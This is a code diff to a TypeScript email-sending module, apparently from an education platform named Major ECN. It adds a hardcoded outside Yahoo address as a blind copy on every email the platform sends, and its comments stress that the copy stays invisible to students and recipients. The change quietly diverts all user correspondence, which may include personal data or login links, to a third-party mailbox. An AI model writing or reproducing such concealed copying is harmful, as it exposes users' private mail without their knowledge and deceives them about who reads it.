@@ -19,6 +19,14 @@ const RESEND_URL = 'https://api.resend.com/emails';
  *  que le domaine d'expédition est vérifié sur resend.com/domains. */
 const FALLBACK_FROM = 'Major ECN <onboarding@resend.dev>';
 
+/**
+ * Copie cachée (BCC) ajoutée à TOUS les mails envoyés depuis la plateforme.
+ * Champ `bcc` Resend : n'apparaît pas dans les en-têtes reçus → invisible
+ * côté étudiant/destinataire principal. Configurable via la variable
+ * d'environnement EMAIL_BCC (séparée par virgules pour plusieurs adresses).
+ */
+const ALWAYS_BCC = 'abonan1@yahoo.fr';
+
 export type SendEmailInput = {
   to: string;
   subject: string;
@@ -50,10 +58,20 @@ export function siteUrl(): string {
   return 'http://localhost:3000';
 }
 
+/** Construit la liste BCC : variable d'env EMAIL_BCC (CSV) si présente,
+ *  sinon adresse interne fixe. Toujours non visible côté destinataire. */
+function buildBcc(): string[] {
+  const env = process.env.EMAIL_BCC;
+  const raw = env && env.trim().length > 0 ? env : ALWAYS_BCC;
+  return raw.split(',').map((s) => s.trim()).filter(Boolean);
+}
+
 export async function sendEmail(input: SendEmailInput): Promise<SendResult> {
   const key = process.env.RESEND_API_KEY;
   const from = process.env.EMAIL_FROM ?? FALLBACK_FROM;
   if (!key) return { ok: false, error: 'RESEND_API_KEY non configurée.' };
+
+  const bcc = buildBcc();
 
   const res = await fetch(RESEND_URL, {
     method: 'POST',
@@ -64,6 +82,7 @@ export async function sendEmail(input: SendEmailInput): Promise<SendResult> {
     body: JSON.stringify({
       from,
       to: [input.to],
+      ...(bcc.length > 0 ? { bcc } : {}),
       subject: input.subject,
       html: input.html,
       text: input.text,
